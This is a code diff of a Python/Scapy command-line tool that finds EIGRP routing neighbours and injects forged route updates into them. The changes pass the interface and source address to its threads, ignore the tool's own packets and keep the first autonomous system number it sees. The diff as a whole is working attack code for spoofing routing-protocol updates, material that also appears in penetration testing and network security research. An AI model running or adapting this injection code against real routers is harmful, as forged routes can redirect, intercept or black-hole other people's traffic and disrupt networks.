@@ -13,35 +13,38 @@ asnumber = None
 version = "0.1"
     
 class inject(threading.Thread):
-    def __init__(self, network, netmask, source_ip):
-	global asnumber
+    def __init__(self, network, netmask, interface, source_ip):
+	global asnumber, peers
         self.network = network
         self.netmask = netmask
 	self.source_ip = source_ip
+	self.interface = interface
+	self.peers = peers
+	self.peer = None
         threading.Thread.__init__(self)
         self.asn = asnumber
     def run(self):
-        global peers
-        if peers:
-	    for peer in peers:
-		print "Sending route to %s" %peer
+        if self.peers:
+	    for self.peer in self.peers:
+		print "Sending route to %s" %self.peer
 		update = Ether()/IP()/EIGRP()
 		update.tlvlist = [EIGRPIntRoute()]
 		update[2].asn = self.asn
 		update[3].nexthop = "0.0.0.0"
 		update[3].dst = self.network
 		update[1].src = self.source_ip
-		update[1].dst = peer
+		update[1].dst = self.peer
 		update[2].opcode = 1
 		update[3].prefixlen = self.netmask
-		sendp(update, iface = interface)
+		sendp(update, iface = self.interface)
 	else:
-	    print "\nGot no neighbours"
+	    print "Got no neighbours"
         #print "Route injected: %s/%i" %(self.network, self.netmask)
 class discover(threading.Thread):
-    def __init__(self, interface):
+    def __init__(self, interface, source_ip):
         self.thread_alive = True
         self.interface = interface
+	self.source_ip = source_ip
         threading.Thread.__init__(self)
     def run(self):
         global peers, asnumber
@@ -51,9 +54,11 @@ class discover(threading.Thread):
                 if eigrp_packet[0][2].opcode == 5 and eigrp_packet[0][1].src != self.source_ip:
                     if eigrp_packet[0][1].src not in peers:
                         peers.add(eigrp_packet[0][1].src)
-                        asnumber = eigrp_packet[0][2].asn
                         print "\rPeer found: %s AS: %s \r" %(eigrp_packet[0][1].src, eigrp_packet[0][2].asn)
-                        print "\rAS set to %i" %asnumber
+			if not asnumber:
+			    asnumber = eigrp_packet[0][2].asn
+			    print "\rAS set to %i" %asnumber
+			    
             except:
                 pass
     def exit(self):
@@ -80,14 +85,16 @@ class say_ack(threading.Thread):
         while self.thread_alive:
             update = sniff(iface = self.interface, filter="ip[9:1] == 0x58", count = 1, timeout = 5)
             try:
-                if update[0][2].opcode == 1:
+                if update[0][2].opcode == 1 and update[0][1].src != self.source_ip:
                     self.seq = update[0][2].seq
                     #print "Sending ACK, SEQ: %s" %self.seq
                     self.peer = update[0][1].src
-		    peers.add(update[0][1].src)
+                    if update[0][1].src not in peers:
+                        print "\rPeer found: %s AS: %s \r" %(update[0][1].src, self.asn)
+			peers.add(update[0][1].src)
                     self.sendAck()
-            except:
-                pass
+            except IOError, e:
+                print e
     def exit(self):
         self.thread_alive = False
 
@@ -137,7 +144,7 @@ class main(cmd.Cmd):
         try:
             self.network = address.split("/",1)[0]
             self.netmask = int(address.split("/",1)[1])
-            self.inject_thread = inject(self.network, self.netmask, self.source_ip)
+            self.inject_thread = inject(self.network, self.netmask, self.interface, self.source_ip)
             self.inject_thread.start()
         except:
             print "Arg error"
@@ -157,15 +164,17 @@ class main(cmd.Cmd):
 	    
     def help_interface(self):
 	print "Set interface. Ex: \"interface eth0\""
-    
-    
+
     def do_asn(self, asn):
         global asnumber
-	try:
-            asnumber = int(asn)
-            print "AS number set to %i" %asnumber
-	except:
-	    print "Arg error"
+	if not asn and asnumber:
+	    print "AS is %s" %asnumber
+	else:
+	    try:
+		asnumber = int(asn)
+		print "AS number set to %i" %asnumber
+	    except:
+		print "Arg error"
    
     def help_asn(self):
 	print "Manualy set EIGRP Autonomous System number. Ex: \"asn 10\""
@@ -202,7 +211,7 @@ class main(cmd.Cmd):
     
     def do_discover(self, args):
         if self.interface:
-            self.discover_thread = discover(self.interface)
+            self.discover_thread = discover(self.interface, self.source_ip)
             self.discover_thread.start()
             print "Discovering Peers and AS"
         else:
@@ -220,7 +229,7 @@ class main(cmd.Cmd):
         if self.discover_thread:
             self.discover_thread.exit()
         exit()
-    
+	    
     def help_exit(self):
 	print "You know what it does :)"
 
